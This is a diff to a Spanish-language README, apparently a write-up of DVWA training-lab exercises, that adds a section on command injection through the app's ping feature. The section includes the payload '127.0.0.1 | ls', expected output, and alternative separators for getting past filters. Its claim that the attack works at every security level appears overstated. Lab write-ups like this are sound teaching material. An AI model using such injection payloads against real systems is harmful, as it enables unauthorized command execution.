@@ -86,4 +86,39 @@ assets/dvwa_bruteforce.php
 ### **Ejecución del Script**
 ![Ejecución](assets/Captura4.png)
 
-🔥 **¡Fuerza Bruta exitosa!** 🚀
+## **2. Inyección de Comandos en DVWA**
+
+### **Descripción**
+DVWA permite la funcionalidad de hacer `ping` a un dispositivo, pero el backend concatena directamente la entrada del usuario al comando `ping`, permitiendo la ejecución arbitraria de comandos del sistema.
+
+### **Carga útil para explotación**
+Podemos ejecutar comandos arbitrarios usando `|` (pipe). Por ejemplo:
+```bash
+127.0.0.1 | ls
+```
+✅ **Salida esperada:**
+```
+index.php
+config.php
+README.md
+```
+🔹 **Este ataque funciona en todos los niveles de seguridad: bajo, medio y alto.**
+
+### **Capturas de Pantalla**
+#### **Inyección de Comandos Exitosa**
+![Inyección de Comandos](assets/Captura5.png)
+
+#### **Subida de Archivo Malicioso**
+![Subida de Archivo](assets/Captura6.png)
+
+## **Requisitos**
+- **PHP instalado en el sistema**
+- **Python 3 (para el script de fuerza bruta)**
+- **DVWA en ejecución** con nivel de seguridad `high`
+- **Archivo `rockyou.txt`** como diccionario de contraseñas
+
+## **Notas**
+- **Si el script de fuerza bruta no encuentra la contraseña:** Asegúrate de que DVWA está en el nivel `high` y que el `PHPSESSID` es válido.
+- **Si la inyección de comandos no funciona:** Prueba diferentes métodos como `;`, `&&`, o `$IFS`.
+- **Si necesitas cambiar la lista de contraseñas:** Modifica el archivo `rockyou.txt` o usa otro diccionario.
+
